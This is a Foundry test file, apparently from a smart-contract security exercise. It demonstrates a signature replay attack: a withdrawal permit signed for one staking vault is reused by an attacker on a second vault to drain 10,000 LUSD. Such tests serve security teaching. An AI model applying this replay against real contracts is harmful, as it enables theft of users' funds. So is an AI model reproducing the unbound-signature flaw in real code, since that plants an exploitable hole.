// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/MyReplaylist/Token.sol";
import {StakingVault} from "../src/MyReplaylist/StakingVault.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

pragma solidity ^0.8.0;

contract MyReplaylistTest is Test {
    using ECDSA for bytes32;

    Token dai;
    Token lusd;
    StakingVault daiStakingVault;
    StakingVault lusdStakingVault;

    address public daiDeployer;
    uint256 public daiDeployerPrivKey;
    address public lusdDeployer = makeAddr("lusdDeployer");
    address public attacker = makeAddr("attacker");

    uint8 public v;
    bytes32 public r;
    bytes32 public s;

    function setUp() public {
        (daiDeployer, daiDeployerPrivKey) = makeAddrAndKey("daiDeployer");
        vm.deal(daiDeployer, 10 ether);
        vm.deal(lusdDeployer, 10 ether);

        vm.startPrank(daiDeployer);
        dai = new Token("Dai Stablecoin", "DAI", 100000e18);
        daiStakingVault = new StakingVault(address(dai));
        dai.approve(address(daiStakingVault), type(uint256).max);
        daiStakingVault.deposit(20000e18);
        daiStakingVault.withdraw(payable(daiDeployer), 10000e18);

        bytes memory digest = abi.encode(daiDeployer, payable(attacker), 10000e18, daiStakingVault.nonce(daiDeployer));
        bytes32 hash = keccak256(digest).toEthSignedMessageHash();
        (v, r, s) = vm.sign(daiDeployerPrivKey, hash);
        daiStakingVault.withdrawWithPermit(daiDeployer, payable(attacker), 10000e18, v, r, s);
        vm.stopPrank();

        vm.startPrank(lusdDeployer);
        lusd = new Token("Liquidity Stablecoin", "LUSD", 100000e18);
        lusdStakingVault = new StakingVault(address(lusd));
        lusd.transfer(daiDeployer, 20000e18);
        vm.stopPrank();

        vm.startPrank(daiDeployer);
        lusd.approve(address(lusdStakingVault), type(uint256).max);
        lusdStakingVault.deposit(20000e18);
        lusdStakingVault.withdraw(payable(daiDeployer), 10000e18);
        vm.stopPrank();

        vm.deal(attacker, 1 ether);
    }

    function testMyReplaylist() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.prank(attacker);
        lusdStakingVault.withdrawWithPermit(daiDeployer, payable(attacker), 10000e18, v, r, s);

        assertEq(lusdStakingVault.balanceOf(daiDeployer), 0);
        assertEq(lusd.balanceOf(attacker), 10000e18);
        assert(vm.getNonce(attacker) < currentNonce + 2);
    }
}
